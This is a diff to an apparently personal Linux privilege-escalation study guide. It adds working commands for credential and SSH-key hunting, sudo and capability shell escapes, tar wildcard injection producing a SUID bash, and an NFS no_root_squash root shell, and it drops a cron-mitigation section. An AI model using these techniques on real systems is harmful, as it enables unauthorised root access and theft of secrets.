@@ -16,6 +16,13 @@ Privilege escalation is all about:
 [Sushant](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html)
 
 
+## Automated Tools:
+* [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
+* [LinEnum](https://github.com/rebootuser/LinEnum)
+* [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)
+* [Linux Priv Checker](https://github.com/sleventyeleven/linuxprivchecker)
+
+
 ## Checklists
 
 ### Kernel and Distribution Release Details
@@ -106,18 +113,21 @@ Privilege escalation is all about:
 * What Services are running? Who is the owner? `ps -aux | grep root`
 
 ## Password Hunting with Grep:
+
+* `find / -name "*password*" -perm -u+r 2> /dev/null`
 * `grep --color=auto -rnw '/' -ie "PASSWORD=" --color=always 2> /dev/null`
+* `find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;`
 * `locate password | more`
 * `find / -name id_rsa 2> /dev/null`
 
-## Automated Tools:
-* [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
-* [LinEnum](https://github.com/rebootuser/LinEnum)
-* [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)
-* [Linux Priv Checker](https://github.com/sleventyeleven/linuxprivchecker)
+## Preseed
+A preseed.cfg file is used in Debian-based Linux distributions to automate the installation process. It contains answers to the questions that the installer normally asks, allowing for a fully unattended installation.  Think about Canonical MaaS installed by snap!
+
 
 ## Sudo Overview Shell escaping:
-**GTFOBins:** [Shell escaping techniques](https://gtfobins.github.io/)
+
+**GTFOBins:** [Shell escaping techniques](https://gtfobins.github.io/) is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.
+
 ```sh
 sudo vim -c ':!/bin/sh'
 ```
@@ -291,12 +301,20 @@ chmod +s /tmp/bash
 For the purpose of performing permission checks, traditional UNIX implementations distinguish two categories of processes: privileged processes (whose effective user ID is 0, referred to as superuser or root), and unprivileged processes (whose effective UID is nonzero). Privileged processes bypass all kernel permission checks, while unprivileged processes are subject to full permission checking based on the process’s credentials (usually: effective UID, effective GID, and supplementary group list). Starting with kernel 2.2, Linux divides the privileges traditionally associated with superuser into distinct units, known as capabilities, which can be independently enabled and disabled. Capabilities are a per-thread attribute.
 
 
+* This would not come up with searching SUID's, so it is important to check!
+
 
 * In command prompt type: `getcap -r / 2>/dev/null`
 * From the output, notice the value of the “cap_setuid” capability.
-
+* Having the capability `=ep` means the binary has all the capabilities.
 Exploitation
 
+Alternatively the following capabilities can be used in order to upgrade your current privileges.
+
+```sh
+cap_dac_read_search # read anything
+cap_setuid+ep # setuid
+```
 
 * In command prompt type:
 `/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'`
@@ -347,35 +365,158 @@ uid=1000(TCM) gid=1000(user) euid=0(root)
 ```
 The **effective user ID (`euid=0`) is root**, confirming privilege escalation.
 
+!!!importanat 
+    One of the most comon cron jobs Priv Esc technique is the file overweites!
+
 ## Why Does This Work?
 - **Cron jobs execute scripts as root**.
 - **No absolute path in the cron job** allows execution of user-controlled scripts.
 - **Writable scripts in `$PATH`** enable privilege escalation.
 
-## Mitigations
-- **Use absolute paths** in cron jobs:
+
+
+## Escalation via Cron Wildcards
+
 ```sh
-* * * * * root /etc/scripts/overwrite.sh
+* * * * * root /usr/local/bin/compress.sh
+
+TCM@debian:~$ cat /usr/local/bin/compress.sh 
+#!/bin/sh
+cd /home/user
+tar czf /tmp/backup.tar.gz * `<----- backup via a wild card `
+TCM@debian:~$ 
+
 ```
-- **Restrict write access**:
-```sh
-chmod 700 /etc/scripts/
-chown root:root /etc/scripts/overwrite.sh
-```
-- **Run cron jobs with least privileges**:
-```sh
-* * * * * user /home/user/script.sh
-```
-- **Monitor cron logs**:
-```sh
-grep CRON /var/log/syslog
-```
+We can do injection.
+
+`echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh`
+
+ `touch /home/user/--checkpoint=1`
+ `touch /home/user/--checkpoint-action=exec=sh\ runme.sh`
+
+
+These two commands are used to exploit certain vulnerable versions of tar by tricking it into executing a malicious script. This technique is part of Linux Privilege Escalation via Arbitrary File Execution in tar.
+
+## Command 1
+
+* touch creates an empty file named --checkpoint=1.
+* In vulnerable versions of tar, the --checkpoint option prints a message after processing every file.
+* Here, --checkpoint=1 forces tar to print a message after processing one file.
+
+## Command 2 
+
+* touch creates another file named --checkpoint-action=exec=sh runme.sh.
+* The --checkpoint-action flag in vulnerable tar versions allows executing commands when a checkpoint is hit.
+* In this case, when tar processes the file, it will execute:
+
+`sh runme.sh`
+
+* This runs runme.sh as the user who executed tar.
+  If tar is run as root, the script executes as root.
+
+`/tmp/bash -p`
 
 **misconfigured cron jobs** can allow privilege escalation. Implementing security best practices can mitigate this risk.
 
+**Check systemd timers as well !!**
 
 
+## Privilege Escalation Via NFS Root squashing 
 
+This is an NFS (Network File System) misconfiguration exploit where root permissions can be abused due to the no_root_squash option.
+What is NFS Root Squashing?
+
+    NFS (Network File System) allows files to be shared over a network.
+    Normally, when an NFS client mounts a remote directory, any action performed as root on the client should not be treated as root on the server. Instead, it is mapped to an unprivileged user (like nobody).
+    This protection is called "root squashing".
+
+* The Vulnerability
+
+    If the no_root_squash option is enabled in /etc/exports, root actions on the client are executed as root on the NFS server.
+    This allows an attacker to create and execute root-owned binaries remotely.
+
+
+Exploiting no_root_squash for Root Access
+* Check NFS Export Configuration
+
+`cat /etc/exports`
+
+Example output:
+
+`/tmp *(rw,no_root_squash)`
+
+    /tmp is exported to all clients (* means anyone can mount it).
+    rw → Clients can write to this share.
+    no_root_squash → Root user on client = Root user on server (Vulnerable!)
+
+* Identify Shared NFS Directories
+
+`showmount -e 10.10.171.100`
+
+This lists all exported (shared) NFS directories.
+
+Example output:
+
+Export list for 10.10.171.100:
+/tmp *
+
+This confirms /tmp is shared.
+*  Mount the NFS Share
+
+Create a local directory:
+
+mkdir /tmp/1
+
+Mount the remote /tmp directory:
+
+`mount -o rw,vers=2 10.10.171.100:/tmp /tmp/1`
+
+    -o rw → Mount with read/write permissions.
+    vers=2 → Use NFS version 2 (adjust if needed).
+
+Now, anything written in /tmp/1 is actually written to the remote /tmp on the NFS server.
+* Create a SUID Binary to Get Root
+
+Now that we have root privileges on the NFS share, let's create and compile a root shell.
+Write the Root Shell Code
+
+`echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c`
+
+    This simple C program will launch a root shell when executed.
+
+Compile the Program
+
+`gcc /tmp/1/x.c -o /tmp/1/x`
+
+    This creates an executable binary named `x.`
+
+Set the SUID Bit
+
+`chmod +s /tmp/1/x`
+
+    SUID (chmod +s) allows the program to run as root, even for normal users.
+
+* Execute the Root Shell
+
+Now, exit the NFS mount and try running the backdoor shell:
+
+`/tmp/1/x`
+
+Then, verify if we got root access:
+
+`id`
+
+If successful, output should be:
+
+uid=0(root) gid=0(root) groups=0(root)
+
+## Spawn a Fully Interactive TTY Shell
+
+If you're www-data, try upgrading your shell:
+
+```sh
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
 ## References
 
 [Linux Privilege Escalation using Capabilities](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/)
